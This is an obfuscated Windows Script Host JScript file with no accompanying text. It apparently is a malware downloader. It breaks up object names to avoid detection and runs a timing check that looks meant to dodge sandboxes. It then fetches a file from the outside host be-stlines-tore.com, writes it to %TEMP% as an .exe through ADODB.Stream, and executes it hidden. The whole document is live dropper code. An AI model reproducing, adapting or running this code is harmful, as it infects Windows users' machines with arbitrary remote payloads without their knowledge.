var WS = false;
var BO = "Create"+"Object";
var U = function F() {return WScript[BO]("WScript"+".Shell");}(), G = 11;
var AW = "MSXML2"+".XMLHTTP";
var RQ = 2;
var EL = RQ - 2;
function K(E){U["Run"](E, EL, EL);};
function O(){return AW + "";};
function J(XV, FP){EL = EL * 1; return XV - FP;};
function SN(){return BO;};
/*@cc_on
  @if (@_win32 || @_win64)
    WS = true;
  @end
@*/
if (WS)
{
var IP = "";
function VZ(){return 22;};
var H = 0; var EV = 0;
function V()
{
var E0 = new this["Date"]();
var QZ = E0["getUTCMilliseconds"]();
WScript["Sleep"](VZ());
var E0 = new this["Date"]();
var D0 = E0["getUTCMilliseconds"]();
WScript["Sleep"](VZ());
var E0 = new this["Date"]();
var MR = E0["getUTCMilliseconds"]();
var H = "L";
H = J(D0, QZ);
var EV = "RI";
EV = J(MR, D0);
IP = "open";
return J(H, EV);
}
var HW = false;
var DP = false;
for (var D = EL; D < VZ() * 1; D++){if (V() != EL){
HW = true; 
EV = "31" + 11 * H + EV; 
DP = true; 
break;
}}
function A() {return ((HW == true) && (HW == DP)) ? 1 : EL;};
if (HW && A() && DP){
function GW() {return U["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1b71Omg6zYWJKs.ex" + "e";};
 E1 = O();
 Q = WScript[BO](E1);
 var P = 1;
do { 
	for (;P;){
	try {
		if (P == 1)
		{
			Q[IP]("GET", "http://be-stlines-tore.com/u3rsap", false);
			Q["send"]();
			RC = "Sleep";
			P = 2;
		}
		WScript[RC](VZ() + 120); 
		if (Q["readystate"] < 2 * 2) continue;
		P = EL;
		function R(NP) {var B = (1, 2, 3, 4, 5, NP); return B;};
		VT = WScript[SN()]("ADODB.Stream");
		E1 = VT;
		E1[IP]();
		E1["type"] = R(1);
		E1["write"](Q["ResponseBody"]);
		VT["position"] = R(EL);
		E1["Save" + "ToFile"](GW(), 2);
		VT["cl"+"ose"]();
		HU = GW();
		K(HU);
	} catch(R0){};};
}while (P);
}
}

